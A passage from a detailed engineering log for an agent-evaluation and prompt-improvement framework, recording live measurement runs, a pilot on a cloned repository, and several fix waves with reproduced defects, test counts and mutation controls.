| M6 exclude from the candidate only (drop the symmetry) | 4 failed |

Green bar: `pytest -q` **2746 passed, 7 skipped, 1 xfailed** (2720 before,
+26); `mypy aef examples` clean on 135 files; `ruff check .` clean;
`ruff format --check aef tests examples` clean on 282 files.

## S1c — the lesson was fresh, it carried no quotation, and the layer paid (ADR 0184)

**Model: `claude-opus-5[1m]`**, the session default; `--model` deliberately
absent from the argv, the answering model read back from `modelUsage` and
`claude-opus-5[1m]` for **102 of 102** arm calls. **103 live calls of a 110
budget** (1 preflight + 102 arms). Preflight green: `rc 0`, `result 'OK'`,
`input_tokens 2`.

**Dimension 2 moves 12 → 14, heading 72 → 74.** ADR 0175's falsification —
*(c) ≤ (b)* — did **not** fire this time, and the difference is not the layer:
it is the two defects ADR 0180 removed from underneath it.

**What changed since S1b**, all three of the things ADR 0175's own last section
asked for:

1. **The excerpt is gone.** S1b's lesson read *"observed 31 words, 208 chars:
   'Vaccination clinics have relocated from Netherby Grange…'"* — an example of
   an over-long summary inside a lesson telling the model to be shorter, and ADR
   0162 measured that shape making two at-cap runs LONGER. Checked twice here:
   `seed.py::assert_no_excerpt` finds **0** twelve-character windows of any train
   run's output in any of the 23 records, and `leak_check.py` finds **0** in any
   of the **85 live lesson blocks** across five arm-repeats. *The first version
   of that detector was wrong and it is recorded rather than quietly fixed*: it
   scanned the whole prompt and reported 28 leaks in arm (a) — the arm with no
   retrieve node — because a summary and the next passage share
   `' for the first time '`. A detector that fires where there is no channel is
   measuring the language.
2. **The producer is on the scored split** (ADR 0180's `record_check_outcomes`,
   the block `run_scenario(..., memory=…)` now runs). S1b's arm (c) wrote
   `"failures": {}`. Here the entry is **rank 0 at scenario 1 and rank 0 at
   scenario 17** — S1b's walked 0 → 25–39 — and reaches the model in **15 of 17**
   prompts against S1b's 10. `runs_since_last_seen` climbs while the model
   succeeds and resets the moment a scored run reproduces the cap failure.
3. **Repeats**, paid for by cutting arm (d) on S1b's proof that it sends arm
   (c)'s prompts byte for byte.

**The arms** (17 validation scenarios, 4 owner-check negatives):

| arm | repeats | mean | spread | negatives | neg spread | prompt hashes |
|---|---|---|---|---|---|---|
| (a) no retrieve | 1 | 0.9176 | – | 0.8500 | – | `5956e7ff…` (= S1b's) |
| (b) raw records | 3 | **0.9059** | **0.0353** | 0.8333 | 0.0500 | `c6873a50…` ×3 (= S1b's) |
| (c) + knowledge @ 3.0 | 2 | **0.9588** | 0.0118 | 0.9250 | 0.0500 | 2 distinct |

(a) and (b) reproduce S1b's prompt hashes byte for byte, which is what makes the
two nights a comparison. **(b)'s three repeats are byte-identical prompts**, so
its 0.0353 is a true same-prompt live variance on the full split — with **9 of
17 scenarios changing score** behind it, which is the useful shape: scenarios are
noisy, the mean of seventeen is not. (c)'s two repeats are *not* a same-prompt
sample, and that is a consequence of the fix: once the producer is on the split,
what the model is shown depends on what the model previously said.

**The pre-registered rule, evaluated by script:**

```
(c) − (b) on the mean       = +0.0529
larger repeat spread        =  0.0353
(c) − (b) on the negatives  = +0.0917
larger negatives spread     =  0.0500
BRANCH: 12 -> 14
```

**The third (b) repeat was added after seeing the first two** — two repeats had
returned *identical* means (0.8941, 0.8941), a 0.0000 spread that is not a
credible noise estimate from n=2 — and it is recorded because a post-hoc repeat
is the shape of optional stopping. It cannot have been chosen to pass: it moved
(b)'s mean **up** (delta +0.0647 → +0.0529) and widened the bar thirty-fold
(0.0000 → 0.0353). Both against the claim; the claim survived both. No budget
remained for a symmetric third (c).

**Stated against the claim**: the delta does **not** clear S1b's 0.0857
same-prompt band. That band was a 7-scenario mean's spread and this is a
17-scenario mean's, measured here at 0.0353 — the ADR says which instrument it
uses and why, and says that under S1b's the dimension does not move.

**`knowledge_boost` stays 0.0 and no `aef/` file was touched.** The knob was
never varied live — both (c) repeats ran at 3.0, because the offline sweep says
the shipped default puts the entry at rank 20–23 of 24 and in **0/17** prompts,
and a freshness-pinned upper bound says even a perfect producer reaches the
top-5 in only 2/17 there. So what is measured is *the layer at 3.0 vs no layer*,
not the coefficient. The knob's own A/B ((c)@0.0 vs (c)@3.0, 34 calls) has never
been run in this programme, and **`knowledge_boost` cannot be set from `aef.yaml`
at all** — `ContextConfig` carries `impl` and `token_budget`, `build_retriever`
passes neither it, `staleness_half_life` nor `knowledge_min_occurrences`. Two of
those three have defaults set by measurement that no adopter can act on.

**Reported, not fixed** (five findings, ADR 0184): freshness is computed from
*recorded* time, so the producing run counts against its own lesson
(`runs_since_last_seen` floors at 1) **and six of the seventeen scored scenarios
are timestamped before the seed's failures and can never refresh a lesson at
all**; the three retriever knobs are unreachable from config; `run_scenario`'s
`memory=` is a sink only, so `aef loop score --memory` gets the producer and
never the retrieval it feeds; a graph's `consolidate` node runs before the
check-failure record exists, so a real scored split's lessons are one scenario
staler than they need to be; and `render_retrieved_context(max_items=5)` is
still the real budget while `context_budget_tokens` admits 24–47 chunks and
binds on nothing.

**Green bar:** `pytest -q` **2720 passed, 7 skipped, 1 xfailed**; `mypy aef
examples` clean (135 files); `ruff check .` clean; `ruff format --check aef
tests examples docs/research/i12c` 286 files formatted. No test added or
changed and no file under `aef/` touched — this worker measured; it shipped no
behaviour. (An earlier run of the suite showed 30 failures, all
`No such file or directory: 'python'` from sandbox subprocesses, because the
invocation omitted the venv from `PATH`; re-running with the prefix the loop
specifies is green. It was checked against a clean `git archive c2ae339` export
first, which failed the identical 30 — the right answer for the wrong reason,
and the reason is recorded so nobody reports an environment as a defect.)

## M6 — the pilot, on the clone (ADR 0163)

The clone at `<scratchpad>/pilot-marlin`, **copied first** and with its `origin`
remote (which pointed at `/Users/raptor/marlin`) removed before anything ran, so
the pilot could not reach the owner's checkout even by mistake. **41 live calls**
of a ≤ 80 budget; every offline reproduction cost nothing; **no file under
`aef/` was modified**.

`adopt` re-run on a repo adopted by an older `aef` appended blocks to five entry
files — `CLAUDE.md`, `.gitignore`, `AGENTS.md`, `.github/copilot-instructions.md`,
`.cursor/rules/aef.mdc` — and a **second** `adopt` left all five byte-identical
(`shasum -c`: five OKs), with `git diff --numstat` still `36 0` / `5 0`:
insertions only, ADR 0153/0172 holding on a real repo. `migrate` wrote **8**
prompt-agent graphs. `model: ""` was confirmed to mean the session default —
every run's provenance says `claude-opus-5[1m]` — and `gates.live_model_calls:
true` is recorded as the owner's opt-in with what it permits stated in the
owner's terms (ADR 0181).

**Five real objectives, drawn from marlin's own `AGENTS.md` and persona bodies,
across three personas** (`marlin-accela` x2, `marlin-source` x2,
`marlin-reviewer` x1) — whether to flip the Clearwater connector now that
credentials exist; the TAMPA server-to-server token request; a 2000-feature
ArcGIS page with no `exceededTransferLimit`; the Socrata watermark field; a
`handoff-v1` packet with a sender/receiver collision and disagreeing tree SHAs.
Answered live at 453–949 words each, `--tools ""`, with the containment block
(`no_mcp`, `no_project_context`, `no_tools`, `single_turn`, `system_role`;
persona in the system channel) recorded on every one.

**The redaction scan ran on every recorded run: 0 input substitutions, 0 output
matches, 0 dropped keys.** A zero from a scanner that never ran looks identical,
so ADR 0119's control was RUN rather than assumed: 5 of 5 planted credential
shapes caught (`email`, `api_key`, `bearer`, `aws_key`, `opaque_secret`), 2 of 3
secret-shaped working-memory keys dropped. **The residual is named**: marlin's
own subscription UUID — the identifier its boundary rule is written around — is
**not** matched, because ADR 0126 removed `-` from `opaque_secret` to stop
redacting hyphenated English. An owner with UUID-shaped secrets extends the list.

**Then the finding.** `aef loop harvest` promoted **0 of 5** and rejected all
five as *did not re-execute deterministically*, and that is a defect in two
parts, each isolated to one variable offline:

- **F-M6-1** — `aef run --record-runs` builds `RecordedRun(...)` with no
  `model_calls=`, so the determinism re-check replays against an **empty
  cassette**. `RecordedRun.model_calls`' own docstring predicted exactly this
  and called it *"a correct-looking rejection for the wrong reason"*.
  `recorder.py` (which `record` and `bootstrap` use) wraps the provider and
  stores the calls; `aef run --record-runs` is the one recording path that does
  not, and the only one `harvest`, `cycle --runs` and the generated cron are fed
  from.
- **F-M6-2** — with the cassette supplied by hand the run is **still** rejected:
  `harvest._reexecution_services` builds `CassetteProvider(None, …)` with no
  inner provider, so ADR 0169's `prompt_agent__containment` re-executes as
  `isolation: []`, `persona_role: 'unknown'` against a recorded `['no_mcp',
  'no_project_context','no_tools','single_turn','system_role']`, `'system'`, and
  `_reexecutes_identically` compares the encoded trace **byte for byte**. Two
  mechanisms that are each right; their join is a field the re-check has no
  provider to derive.

Three arms, offline, zero calls: **as shipped → rejected; + the cassette →
rejected; + a provider for the re-check → PROMOTED.** So **no run of any
`aef migrate`-generated prompt-agent graph has ever been harvestable, on any
repo.** ADR 0151's J0 scored dim 7 at 4/10 on the inference that no live signal
has ever entered harvest; this is the mechanism behind it, and it is worse than
the inference — the step exists, is documented, exits 0, and refuses its input
with a message naming the one explanation the evidence rules out.

**F-M6-3** — `aef loop cycle --runs` is a silent no-op without `--module`
(`graph = load_graph_reference(args.module) if args.module else None`, and the
harvest leg is guarded on `graph is not None`). Reproduced on two `--no-memory`
invocations differing in one flag: with `--entrypoint` alone, no harvest line at
all; add `--module` and it reports. ADR 0176's "two spellings of which graph" in
a fourth place.

**So `bootstrap` populated the corpus, and the ADR says so wherever it matters.**
Five real objectives, **one uniform owner check** written from the persona's own
rule — the answer must name `developer.accela.com`, because the Developer Portal
issues App ID/Secret and the ACA citizen portal does not — applied unchanged to
every input. 2 of 5 failed it, in two distinct runs, under one signature
(`check:working_memory.prompt_agent:contains`, keyed without its value, ADR
0174), which is what made a lesson possible.

**One live cycle**, ADR 0181's form. Candidate: one four-line bullet appended to
marlin's own persona, `runs=2`, **carrying no excerpt of the model's output** —
ADR 0180's finding 2 visible in the wild. `live_model_calls: True`; 7 corpus
passes, **35 scenario executions**, 30 of them live misses served inside the
worker; G0 pass, G1 pass, G4 pass, G5 pass (**drift 0.007/0.500**), **G2 pass**
(5 re-executed, every previously-passing one still passes) and **G3 FAIL — "1
previously-passing scenario(s) now score below 0.5"**. Read against ADR 0181 on
the same repo, persona and proposer, that is a **third and different rejection**:
0158's was the worker's login, 0181's was a null result, **this one is a
regression the lesson caused** — with the excerpt already removed, so the
excerpt was not the whole mechanism. And **G2 passed while G3 failed on the same
run**, which is ADR 0162's two conflated signals separating in the wild. The
ledger does not say *which* scenario regressed; reported, not fixed.

`monitor` and `digest` are what an owner reads the next morning, and the digest
prints **"Production runs recorded: 5"** and **"Scenarios added to the corpus:
0"** side by side and draws no line between them; its recording warning fires
only when the count is zero, so with `--runs` omitted it advises passing
`--record-runs` to a pilot that had already done so five times.

**Pinned rather than fixed:** one strict xfail in
`tests/cli/test_prompt_repo_acceptance.py` running `adopt → migrate → run
--record-runs → harvest --include-successes` on the synthetic repo and the
`command` stub, asserting `promoted 1 run(s)` — offline, no credential, red the
day **both** blockers close and correctly still xfailing if only one does; plus
one passing description making F-M6-1's single line greppable. F-M6-3 is written
down and deliberately not pinned, because a test asserting today's silence would
be a test asserting a defect.

**Green bar:** `pytest -q` 2721 passed / 7 skipped / 2 xfailed (2730 collected,
from 2728 — **+2**, none removed), `mypy aef examples` clean (135 files),
`ruff check .` clean, `ruff format --check` 280 files. Two non-regressions
recorded because both look like one: run the suite with
`PATH=<repo>/.venv/bin:$PATH` — without it 30 tests fail on `No such file or
directory: 'python'` because `run_sandboxed` scrubs `PATH` to its allowlist —
and `test_a_timed_out_container_is_actually_dead` failed once on a loaded box
mid-pilot and passed in isolation and on the clean re-run.

**Still requires a person:** the real checkout, a third party, the two blockers,
and a redaction pattern list that covers this repo's own UUID.

## S7 / J1 — real signal, bounded, and the falsification that fired (ADR 0164)

**Claimed in advance: dimension 7, 4 → 6 (+2). Claimed after the evidence: +0,
and the rubric is not edited.**

The condition was written down before the pilot ran: (a) real runs enter the
corpus **through `harvest`**, redaction on, counts quoted; (b) a candidate is
proposed **from that evidence**, not from bootstrap-synthesised inputs; (c) the
gates reach a live verdict. With the branches beside it: (a) but no proposal →
+1; **harvest refuses every run → +0 and quote why**; the last +3 unclaimed
either way.

**Harvest refused every run** (M6's F-M6-1 and F-M6-2, both reproduced with a
passing control arm), so the third branch fired. (b) and (c) both held — a
candidate was proposed and the gates reached `REJECT` on it live, under
`live_model_calls: true`, with 30 live completions inside the worker — but from
`bootstrap`'s evidence, which (b) excludes by name. `bootstrap` is the system
asking itself questions; the dimension is about signal the system did not
commission, and a loop that learns only from questions it chose has no defence
against choosing the ones it already answers well.

**The last +3 stays unclaimed, with the reason: marlin is the owner's own
repository, not a third party.** Every objective was written by the same process
that read the personas, so "a repo nobody wrote to pass" is true of the repo and
not of the objectives. The tenant half of dimension 7 needs someone else's
traffic, someone else's secrets in the redaction scan, and someone else's
judgement of whether the answers were right.

**Recorded and deliberately not acted on:** the pilot is evidence that J0's
4/10 is generous — the `--runs` path is not merely unpopulated, it is unusable
for every model-calling graph. S7 does **not** lower the base, because a worker
that can lower a base can raise one, and `UPGRADE_LOOP.md` gives base moves to
J0. It is written down so the next independent re-score has it in hand.

A rubric row was drafted and deleted rather than softened. It would have read
*"real runs reached memory and the gates judged a lesson built from them"* —
every word true, none of it the thing dimension 7 scores. The heading stays
**72 / 100** and `tests/test_rubric_arithmetic.py` recomputes it from the rows.

The most useful thing the pilot produced belongs to dimension 2, not 7, and is
left for whoever re-opens it: **G3 rejected because a scenario the incumbent
passed dropped below 0.5 with the lesson in the prompt** — a regression on the
task metric from a rule-based lesson whose model excerpt ADR 0180 had already
removed.

## Fix wave L1 — the branch nobody named, and two reports wrong about themselves (ADR 0189)

**Zero live model calls.** `model_provider.impl: command` with
`argv: ["/bin/echo", "{system}", "{prompt}"]` throughout. **No rubric dimension
moves.** All three of ADR 0187's strict xfails are now passing regression
tests; each was reproduced by RUNNING it before a line was edited, and each fix
was mutated and watched to fail its own control.

**F-M8-1 (HIGH) — `git init -b trunk` and the documented sequence exits 0.**
Reproduced verbatim: adopt 0, migrate 0, bootstrap 0, bless 0, doctor 1, then

```
  no agent source at .claude/agents/one-agent.md in main: no candidate
cycle verdict: no agent source at .claude/agents/one-agent.md in main: no candidate
EXIT=0        >>> ledger kinds: ['blessed']   >>> `main` exists: False
```

The persona is present and was blessed one step earlier; the ref is what is
absent, and the sentence blames the file in the same words an empty proposal
legitimately uses. Three parts, as 0187 asked:

- **The default is derived**, in `resolve_default_base_ref(repo)` — one
  function, the CLI imports it (ADR 0149's rule). Order: `origin/HEAD` first,
  because it is the repository's own published answer and does not move when
  the operator checks something else out, so a nightly cycle and an interactive
  one resolve the same base; then the branch HEAD is on, **unless it is one of
  the loop's own**, because otherwise a cycle run over an un-gated candidate
  bases the next one on it and G0's budget and G5's drift are measured against
  a baseline nothing blessed; then `FALLBACK_BASE_REF = "main"` for a detached
  HEAD with no remote. 0187's middle term — "the branch at state-dir creation"
  — was **dropped deliberately**: it needs a new persisted file under `--state`
  to settle one case the loop-branch exclusion already settles from what
  exists, and a default that has to invent state to be derivable is ADR 0139's
  shape again.
- **A missing ref is a configuration error**: `EXIT_ERROR` (3), naming the ref
  and listing what exists, on `cycle` / `gate` / `run` / `bless` / `doctor`.

  ```
  error: base ref 'main' does not exist in <repo>. This repository's branches are:
  loop/cycle-20260905T082344-prompt, trunk. Pass --base <ref> naming one of them; the
  default is this repository's own default branch (origin/HEAD, else the branch you
  are on), not the literal 'main'.
  ```

  Not in `_preflight`: `monitor` shares it and reads no ref, so putting it
  there made a read-only command start requiring a git repo — five tests went
  red and said so, and the answer to a control firing on the wrong command is
  to move it, not to weaken it. `require_base_ref` also returns silently on a
  directory that is not a repository at all: `doctor` is a diagnostic and must
  still say what is missing rather than refuse to look.
- **`GitRepo.ref_exists`** splits the question `path_exists_at` could not
  answer, and the surviving message says which one it answered: `(the ref
  exists; the file is not in it)`.

Same repo, same commands, after: `proposed … gated: reject — G2 rejected it`,
`EXIT=1`, ledger `['blessed', 'proposed', 'gated', 'rejected']` — the same
replay-artefact rejection keystone reached, on a repository with no `main`.

**F-M8-2 (LOW) — the header did not count its own rows.** `found 2 skill(s)`
over three, reproduced; keystone's `found 4` over 5 and datamining's `found 6`
over 7 in miniature. Now `found 3 skill(s) and did NOT migrate any of them
(2 yours + 1 aef's own):`, and with no aef skill present the parenthetical is
absent. ADR 0172's D4 subtotal survives *as the parenthetical* — it is still
the number that does not move when adoption runs — and `discover_skills` still
names every declined file. What did not survive is a leading number that was
not the number of rows beneath it. `test_the_report_counts_two_and_still_names_the_third_marked`
pinned the old header and was updated deliberately, reason in its docstring.

**F-M8-3 (MEDIUM) — step 1 named a file adopt had just skipped.** With
`CLAUDE.md` a symlink to `README.md`, adopt printed `skipped … (a symlink …)`
and then `1. Read the generated CLAUDE.md in full before writing any code.`
over a file containing `# scratch\n`. Step 1 is now derived from the same
`written`/`appended`/`skipped` result the report prints — verbatim, all four
shapes:

```
ordinary repo   1. Read the generated CLAUDE.md and AGENTS.md (they are byte-identical) in full before writing any code.
second adopt    (identical — a file skipped as `already carries the current aef block` DOES carry it)
CLAUDE.md link  1. Read the generated AGENTS.md in full before writing any code.
both links      1. aef adopt could put its contract in NO entry file (CLAUDE.md: a symlink …; AGENTS.md: a symlink …) — so nothing below reached a file your coding agent reads. Fix that first: …
```

Two supporting moves: the checklist is rendered **after** both entry files are
handled (the `.gitignore` note three lines below it already worked that way),
and `already carries the current aef block` became a named constant because the
checklist reads it back.

**Mutations** — perturb, watch the control FAIL, restore from a byte backup and
verify by sha256; never `git checkout --`:

| mutation | control | result |
|---|---|---|
| restore the literal `main` default | `…default_branch_is_not_main_does_not_no_op_silently` | FAILED |
| drop the refusal, keep the derivation | `…refused_by_name_and_lists_what_exists` | FAILED |
| let a `loop/` branch be inherited | `…a_loop_branch_is_never_inherited_as_the_base` | FAILED |
| restore the adopter-only subtotal | `…skill_header_count_matches_its_own_listing` | FAILED |
| restore the literal step 1 | `…does_not_point_at_a_claude_md_adopt_skipped` | FAILED |

All four touched files restored byte-identically (`a79f5b1bb2277fa8`,
`e5ca0ff59f066ea2`, `680566dd0c084933`, `bd5f6f90787a7a08`).

**Green bar.** `pytest -q`: 2825 passed, 7 skipped, 1 xfailed, **1 failed**;
2822 → **2834 collected (+12, none removed)** — 9 in the new
`tests/harness/test_base_ref.py`, 1 in `test_migrate_prompt_agents.py`, 2 in
the acceptance file. Three xfails became passes, which is the whole of the 4→1
xfail drop. `mypy aef examples` 135 files clean; `ruff check .` clean;
`ruff format --check aef tests examples` 285 files clean.

**The one red is inherited and outside this wave's files.**
`tests/test_prompt_surface.py::test_the_corpus_readme_records_which_model_wrote_what`
asserts 20 `claude-fable-5-1` and 19 `claude-opus-5[1m]` scenarios over
`corpus/*/*.json`; the corpus holds
`Counter({('claude-opus-5[1m]',): 37, (): 11, ('claude-fable-5-1',): 2})`. It
was already red at `18051c0` before this wave began — ADR 0186 (S3c) re-recorded
the corpus onto one model and this pinned count, plus the `6/17` fraction beside
it in `corpus/README.md`, was not moved with it. `corpus/` and the rubric are
outside this worker's files, and the number is a claim about S3c's measurement
rather than a test to be edited into green, so it is reported rather than
touched.

**Errata.** ADR 0187: all three findings closed; its open design question about
defaulting the base ref is answered above; its xfail expected `EXIT_USAGE` and
the shipped refusal is `EXIT_ERROR`; and its "non-`main` default branches …
until F-M8-1 is fixed" caveat no longer holds (the other five surveyed repos
were still never checked for the shape). ADR 0149: the literal `base_ref =
"main"` was the same defect its own comment in `aef/harness/zones.py` describes
for `agents/demo/graph.py`, three fields away in the same dataclass, and it
survived thirty-eight ADRs after its twin was removed — the rule is about a
*class*, not a constant: any default in `aef/` naming a repository's branch,
path or layout is a guess about someone else's repo and should be derived or
refused rather than spelled.

## Fix wave L2 — the ingestion path opens (ADR 0190)

**All three of ADR 0163's findings closed. Zero live model calls.** Every one
was reproduced by running a command before anything was edited, and every fix
has a mutation that turns its test red and a sha256-verified byte restore.

**The sentence that stops being true:** *"No run of any `aef migrate`-generated
prompt-agent graph has ever been harvestable, on any repo, by any invocation"*
(ADR 0163 §6). `adopt -> migrate -> aef run --record-runs -> aef loop harvest`
now ends in `promoted 1 run(s) to the train split`, offline, through the real
CLI, and M6's strict xfail
(`test_a_recorded_production_run_can_be_harvested_into_the_corpus`) is the
assertion rather than the pin.

**F-M6-1 — the recorder did not record.** `aef run --record-runs` built
`RecordedRun(...)` with no `model_calls=`, so harvest's determinism re-check
replayed every real run against an empty cassette, the call failed, and the run
was rejected as non-deterministic — exactly the outcome
`RecordedRun.model_calls`' own docstring had predicted, *"a correct-looking
rejection for the wrong reason"*. It was the one recording path that skipped
`recorder.py`'s wrapper, and the only one `harvest`, `cycle --runs` and the
generated nightly workflow are fed from. Fixed by using the same recording
`CassetteProvider` those two use — one recorder, ADR 0149's rule — wrapped only
when the run is being recorded, so a plain `aef run` still refuses with
`ServiceNotConfiguredError` rather than a cassette miss.

**F-M6-2 — the re-check could not reproduce a containment fact.** With the
cassette supplied the run was still rejected, on one field:
`_reexecution_services` built `CassetteProvider(None, …)`, so ADR 0169's
`prompt_agent__containment` re-executed as `isolation: [], persona_role:
'unknown'` against a recorded four-element set, and `_reexecutes_identically`
compares the encoded trace byte for byte.

M6 offered two ways out and this wave took **(a)**: the recorded run carries the
provider's own declaration — `provider_isolation`, `provider_name`, captured at
recording time from the object that answered — and the replay reproduces it.
**(b), ignoring `*__containment` keys in the comparison, was rejected as
unsound**: it deletes a recorded fact from the definition of *"behaviour
unchanged"*, so a run recorded under `no_tools` would be admitted on the
strength of a re-execution that never checked — ADR 0169's stamped claim, one
layer down, in the place that is supposed to be checking. The objection to (a)
is 0169's own words about not inventing an absent provider's properties, and it
does not land: the set is *observed* at capture time and stored as data, and
replaying an observation is the opposite of manufacturing one. Nothing live is
reachable — `_RecordedIsolation` declares and its `complete` raises.

Three arms, offline, and after the fix **with no monkeypatching left** (arm 2 in
ADR 0163 had to patch `_reexecution_services` in-process; the missing piece is
now data):

```
arm 0  the run the OLD recorder wrote      -> 1 REJECTED, did not re-execute deterministically
arm 1  + the cassette never written        -> 1 REJECTED, did not re-execute deterministically
arm 2  + the provider declaration          -> promoted 1 run(s) to the train split
```

**The control is exactly as strict as before.** Change only the declaration on a
recorded run — a persona that went out in the system turn, replayed as one that
went out in the user turn — and it is still rejected. That is the case (b) would
have admitted silently.

**F-M6-3 — `cycle --runs` was a silent no-op without `--module`.** Reproduced on
two `--no-memory` invocations one flag apart: arm A printed no harvest line and
exited 0 with a runs directory in hand; arm B, plus `--module`, harvested and
reported. Now refused with `EXIT_ERROR`, naming both flags and what the missing
one is for. `EXIT_ERROR` rather than `EXIT_USAGE` because under the loop's exit
vocabulary 2 reads as a halt and 3 is the code the nightly workflow summarises
as *"fix the invocation"* — and the two sibling refusals in the same function
still return 2, which is ADR 0182's open item 3 and an owner's decision.

**Two of the pilot's observations, acted on.** `harvest` now filters runs by
`graph_id` and says so (`N recorded from another graph, not re-executed here`) —
it had been re-executing another graph's run against this one's entrypoint and
stamping the promoted scenario with the run's own id, masked only by F-M6-1, and
the masking would have lifted in the same commit that fixed it. And `digest`
draws the line the pilot found missing between `Production runs recorded: 5` and
`Scenarios added to the corpus: 0`.

**M6's five real runs, through the fixed leg: 5 of 5 promoted.** Not the stub
— the pilot's own recorded runs, three marlin personas, answered live by
`claude_code`, re-recorded through the fixed recorder from *their own* recorded
declaration (`['no_mcp','no_project_context','no_tools','single_turn',
'system_role']`, read out of each run's containment block) and *their own*
recorded answers (read out of each run's trace). Zero live calls: nothing was
re-requested. The honest other half is that the five files **as the old recorder
wrote them** still reject, five for five — the fix does not retro-repair an
artefact, and getting the pilot's files into a corpus means re-running `aef run
--record-runs`, which costs live calls.

**The rubric is not edited and no row is added.** What changed is that ADR
0164's pre-registered branch — *"if `harvest` refuses every run, claim +0 and
quote why"* — quoted F-M6-1 and F-M6-2 as the why, and both are closed. **S7's
+2 is re-measurable and M6's five real runs are the artifact**, already
recorded and redacted in `docs/research/pilot-marlin/`. Re-measuring is J0's,
not a fix worker's. Clause (b) of that pre-registration — a candidate proposed
*from harvested* evidence — is not claimed here, and the last +3 stays unclaimed
for the reason it always did: marlin is the owner's own repo.

**A near-miss worth recording**, because it is the reason the method counts
tests. The script that removed M6's strict xfail sliced from the *first*
`@pytest.mark.xfail(strict=True,` in the file, and there were two — it deleted
three unrelated tests, and **the suite went green**, because a deleted test
fails nothing. Caught by counting `^def test_` per file before and after, and
restored byte-identically. A test count that only ever goes up is not
paperwork.

**Green bar:** `pytest -q` 2856 passed, 7 skipped, 4 xfailed (2867 collected,
from 2850 — +17 tests, none removed, and one strict xfail became a pass);
`mypy aef examples` clean on 135 files; `ruff check .` clean; `ruff format
--check` clean on 287 files.

## Fix wave L3 — a mode string is not a fact, a flag that bound one proposer of three, and the nightly that still could not propose (ADR 0191)

**Zero live model calls.** Every measurement is a stub provider —
`model_provider.impl: command` pointed at a shell script that exits non-zero on
chosen invocations, a real subprocess through the real `CommandProvider` — or
this repo's own CLI against this repo's own corpus. **No gate's verdict logic
is touched**; `tests/harness/test_promotion_safety.py` is byte-for-byte what it
was. **No rubric dimension moves.** Each of the four findings was reproduced by
RUNNING it before a line was edited, and each fix was mutated and watched to
fail its own control.

Three of the four share one shape: **a fact was inferred from a request rather
than carried from what happened.** F1 inferred "the model was reached" from the
string `"live"`. F2 inferred "this proposer restricts its evidence" from the
fact that *a* proposer did. F6 inferred "there is nothing to propose" from "the
file I guessed at is not there".

### F1 (HIGH) — `--cassette-miss live` with no `--config`, and every scenario becomes a dead call

`_live_provider_from_base_ref` (ADR 0181) read the opt-in *after* the config,
so a missing `--config` returned `None` before anything could refuse:

```
config_path=None, cassette_miss='live':
  _live_provider_from_base_ref -> None   (NO refusal raised)
  ledger will record live_model_calls=False

run_corpus_isolated(cassette_miss='live', live_provider=None):
  s1: score=0.0000 dead_call=True retried=True
        failure=NodeEvaluationError: ModelProviderError: cassette miss (...)
        and no live provider to fall through to
  s2: score=0.0000 dead_call=True retried=True
  s3: score=0.0000 dead_call=True retried=True
  s4: score=0.0000 dead_call=True retried=True
```

Every scenario in the corpus. The failure names a `ModelProviderError`, so ADR
0185's `is_dead_call` — gated on `cassette_miss == "live"` and nothing else —
called all four deaths, each was retried (**the corpus ran twice**), and each
went to G3 as *excluded* rather than scored. On the identical numbers:

```
counted  (ADR 0123, the replayed rule): G3 FAIL — 1 previously-passing
    scenario(s) now score below 0.5 (zero tolerance, regardless of the aggregate)
excluded (ADR 0185, live+no-provider): G3 PASS — candidate mean 1 beats the
    control cohort's p95 of 0.9429
```

Above the 25% floor G3 refuses saying "the model was not answering" when the
truth is "you omitted `--config`". Throughout, the `gated` ledger event
recorded `live_model_calls: false` — the audit trail's own answer to *did this
run under the operator's login?* was **no**, and nothing read it.

Three parts.

- **The harness refuses**, in `_live_provider_from_base_ref`, where it used to
  `return None` — so `gate`, `cycle` and `run` all get it as library entry
  points, and the four CLI commands get it a second time at the surface an
  operator types at (`_require_config_for_live_cassette`).
  `LiveGatingWithoutConfigError` is deliberately **not** a `PolicyConfigError`,
  unlike its sibling `LiveGatingDisabledError`: that class means "the rules
  could not be read" and reports as `EXIT_REJECTED`, a verdict on a candidate,
  and reporting a missing flag as a rejection is what makes CI retry it forever
  (ADR 0075, ADR 0167 §6). This is `EXIT_ERROR`.
- **`is_dead_call` gains a third condition**, `live_provider_present`, passed
  by the caller as a fact about the run it just performed instead of being
  re-derived from the mode it was asked for. A miss with nothing behind it is a
  **miss**: scored 0, counted, never excused, never retried. Both scoring paths
  pass `live_provider is not None` from where they build the cassette, so the
  two constructions cannot drift (ADR 0091).
- **K1's control test was rewritten**, and this is the part worth keeping.
  `test_the_same_miss_fails_when_no_provider_crosses` drove *exactly* the state
  F1 lives in and asserted `results["miss"].outcome.error_count == 1` — true
  before ADR 0185 and true after it, while the same scenario silently became
  `dead_call=True retried=True` and left G3's comparison. A control that
  constructs the failing state and then asserts a property the failure cannot
  move is a control in name only.

After the fix: the refusal raises, and the same four scenarios come back
`score=0.0000 dead_call=False retried=False`.

### F2 (HIGH) — `--graph-id` restricted the evidence for one proposer of three

The flag's help promises *"the graph whose recorded scenarios are this loop's
evidence"*, and the filter lived inside `RuleBasedPromptProposer._admissible`.
`_build_proposer` builds the DEFAULT `RuleBasedProposer()` with no graph id;
`MemoryEvidence.from_store` filtered validation and holdout run ids and nothing
else. On this repo's own two-graph corpus, with three failure records whose
`run_id`s are `summary_agent` train scenarios:

```
$ aef loop cycle --repo . --graph-id demo_agent \
    --agent-path agents/demo/graph.py --corpus corpus --memory ...
  proposed cycle-20260905T085525-0 on local branch loop/cycle-20260905T085525-0
    (never pushed; proposer=rule_based)
```

with the `gated` ledger event reading

```json
"grounded_in": ["m3 (memory): the summary invented a number",
                "m2 (memory): the summary dropped the ferry name",
                "m1 (memory): the summary dropped the reservoir date"]
```

The evidence a proposer may see is a property of the **evidence**, not of which
proposer happens to read it. `MemoryEvidence.from_store` takes `graph_id` and
applies the filter once, so every proposer goes through it; `cycle()` passes
`config.evidence_id` (ADR 0182's namespace, not the archive key). Dropped
records land on their own `foreign` field, separate from `excluded`, because
they are two different operator actions. The rule inside is unchanged and
deliberately narrow — deny what is KNOWN to belong to another graph, admit a
`run_id` the corpus has never heard of, because that is production experience
and it is what the loop exists to learn from.

After the fix:

```
  3 memory record(s) excluded as belonging to a graph other than 'demo_agent'
  no admissible failure memory: all 3 record(s) came from scenarios of another
    graph, not 'demo_agent': no candidate this cycle
```

On the verdict line and not in a note above it, because `cmd_cycle` journals
`lines[-1]` (ADR 0165) and an operator told only "no admissible failure
memory" will go and record more failures when the remedy is to point
`--graph-id` at the graph those runs came from.

### F6 (MEDIUM) — this repo's own nightly cycle still could not propose, and exited 0

ADR 0188 gave the nightly cycle `--graph-id demo_agent`. One line down, with a
non-empty memory file:

```
